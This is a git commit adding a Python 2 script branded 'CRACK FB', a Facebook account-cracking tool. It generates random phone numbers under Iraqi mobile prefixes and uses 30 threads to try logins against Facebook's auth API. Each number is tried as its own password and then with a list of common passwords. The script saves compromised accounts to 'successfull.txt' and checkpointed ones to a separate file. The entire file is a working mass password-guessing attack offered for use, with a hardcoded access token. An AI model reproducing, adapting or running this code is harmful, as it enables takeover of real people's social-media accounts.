352d54487f81396d61532a14316a52b7aceffe25
HaMa LoRdy EzRaiLy <63779958+hamalord4444@users.noreply.github.com>
2021-07-25 23:30:46 +0300

    Add files via upload

---
+++ Hacking-Lord-Comm_V2.py
@@ -0,0 +1,344 @@
+# HAMA LORDY EZRAILY 4444
+import os, sys, re, time, datetime, json, random, datetime, hashlib, threading, urllib, cookielib, getpass, mechanize, requests
+os.system('rm -rf .txt')
+for n in range(4444):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(0)
+    os.system('python2 LORD.py')
+
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a/FB4A;]')]
+
+def exb():
+    print '[!] Exit'
+    os.sys.exit()
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0)
+
+def t():
+    time.sleep(0)
+
+def cb():
+    os.system('clear')
+
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+listgrup = []
+vulnot = "\033[97mNot Vuln"
+vuln = "\033[97mVuln"
+os.system("clear")
+
+
+
+import os, sys, re, time, datetime, json, random, datetime, hashlib, threading, urllib, cookielib, getpass, mechanize, requests
+os.system('rm -rf .txt')
+for n in range(4444):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(0)
+    os.system('python2 LORD.py')
+
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109/it_IT;FBAV/328.0.0.22.119/it_IT;FBAV/328.0.0.22.119/it_IT;FBAV/303.0.0.30.122;]')]
+
+def exb():
+    print '[!] Exit'
+    os.sys.exit()
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0)
+
+def t():
+    time.sleep(0)
+
+def cb():
+    os.system('clear')
+
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+listgrup = []
+vulnot = "\033[97mNot Vuln"
+vuln = "\033[97mVuln"
+os.system("clear")
+
+
+logo = logo ="""
+
+
+
+\033[4;92m++++++++++++++++++++ CRACK FB +++++++++++++++++++++
+
+\033[4;91m+++++++++++++++++++++++++++++++++++++++++++++++++++
+
+\033[4;91m++++++++++++++++++++ YOU_CANT +++++++++++++++++++++
+
+\033[4;91m+++++++++++++++++++++++++++++++++++++++++++++++++++
+
+\033[4;92m++++++++++++++++++++ CRACK FB +++++++++++++++++++++
+
+ \033 AUTHOR>>> HAMA LORDY EZRAILY
+ CHANNEL>>> @CRACKER_TEAM_KURD
+ \033   TB /// AM TOOLA UPDATE AKRETAWA LALAYAN > HAMA LORDY EZRAILY <
+"""
+
+def LORD():
+    os.system('clear')
+    print logo
+    print 10 * '\x1b[1;91m<LORD>'
+    print ' '
+    print ' \x1b[1;92m[1]\x1b[1;92m START CRACK BY NUMBER'
+    print ' \x1b[1;92m[2] \033[1;92mFREE MODE' 
+    print ' \033[1;91m[0]\x1b[1;91m EXIT'
+    print ' '
+    print 10 * '\x1b[1;91m<LORD>'
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    bch = raw_input('\n\x1b[1;91mCHOOSE \x1b[1;94m>>>\x1b[1;90m  ')
+    if bch == '':
+        print '\033[91m[!] Fill in correctly'
+        action()
+    elif bch == '1':
+        os.system('clear')
+        print logo
+        print '\x1b[1;92m  { 750 751 752 770 772 773 774 780 781 782 783 }'
+        try:
+            c = raw_input('\x1b[1;91m CHOOSE CODE  : ')
+            k = '+964'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '\033[91m[!] File Not Found'
+            raw_input('\n[ Back ]')
+            LORD()
+
+    elif bch == '2':
+        os.system('clear')
+        print logo
+        print '\033[92m  { 0750 - 0751 - 0752 - 0770 - 0771 - 0772 - 0773 - 0774 - 0780 - 0781 - 0782 - 0783 }'
+        try:
+            c = raw_input('\033[1;92mCHOOSE CODE  : ')
+            k = ''
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '\033[91m[!] File Not Found'
+            raw_input('\n[ Back ]')
+            LORD()
+    elif bch == '0':
+        exb()
+    else:
+        print '\033[91m[!] Fill in correctly'
+        action()
+    xxx = str(len(id))
+    psb('[\xe2\x9c\x93] ALL CRACK : ' + xxx)
+    time.sleep(0)
+    psb('\x1b[1;92m[\xe2\x9c\x93]\x1b[1;92m WAIT ...')
+    time.sleep(0)
+    psb('[!] TO STOP THE TOOL CTRL+z')
+    time.sleep(0)
+    print 15 * '\x1b[1;91m>>>>'
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[HACKED BY LORD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[CHICKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n'
+                cps = open('save/chickpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+            else:
+                pass2 = '1122334455'
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[HACKED BY LORD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass2 + '\n')
+                okb.close()
+                oks.append(c + user + pass2)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[CHICKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass2 + '\n'
+                cps = open('save/chickpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass2 + '\n')
+                cps.close()
+                cpb.append(c + user + pass2)
+            else:
+                pass3 = '1234554321'
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[HACKED BY LORD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass3 + '\n')
+                okb.close()
+                oks.append(c + user + pass3)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[CHICKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass3 + '\n'
+                cps = open('save/chickpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass3 + '\n')
+                cps.close()
+                cpb.append(c + user + pass3)
+            else:
+                pass4 = '112233445566'
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[HACKED BY LORD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass4 + '\n')
+                okb.close()
+                oks.append(c + user + pass4)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[CHICKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass4 + '\n'
+                cps = open('save/chickpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass4 + '\n')
+                cps.close()
+                cpb.append(c + user + pass4)
+            else:
+                pass5 = '123456654321'
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[HACKED BY LORD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass5 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass5 + '\n')
+                okb.close()
+                oks.append(c + user + pass5)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[CHICKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass5 + '\n'
+                cps = open('save/chickpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass5 + '\n')
+                cps.close()
+                cpb.append(c + user + pass5)
+            else:
+                pass6 = '20032003'
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[HACKED BY LORD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass6 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass6 + '\n')
+                okb.close()
+                oks.append(c + user + pass6)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[CHICKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass6 + '\n'
+                cps = open('save/chickpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass6 + '\n')
+                cps.close()
+                cpb.append(c + user + pass6)
+            else:
+                pass7 = '20042004'
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[HACKED BY LORD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass7 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass7 + '\n')
+                okb.close()
+                oks.append(c + user + pass7)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[CHICKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass7 + '\n'
+                cps = open('save/chickpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass7 + '\n')
+                cps.close()
+                cpb.append(c + user + pass7)
+            else:
+                pass8 = '20052005'
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[HACKED BY LORD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass8 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass8 + '\n')
+                okb.close()
+                oks.append(c + user + pass8)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[CHICKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass8 + '\n'
+                cps = open('save/chickpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass8 + '\n')
+                cps.close()
+                cpb.append(c + user + pass8)
+        except:
+            pass
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 42 * '\x1b[1;94m='
+    print '\033[91m[[\xe2\x9c\x93]]>\x1b[1;91m HACK FINISH ....'
+    print ' [\xe2\x9c\x93]\x1b[1;92m OK/\x1b[1;91mCP :\033[92m ' + str(len(oks)) + '\033[92m /\033[91m ' + str(len(cpb))
+    print ' [\033[91m\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/checkpoint.txt'
+    raw_input('\n[Press Enter To Go Back]')
+    os.system('python2 Hacking_Lord_Comm_V2.py')
+if __name__ == '__main__':
+    LORD()
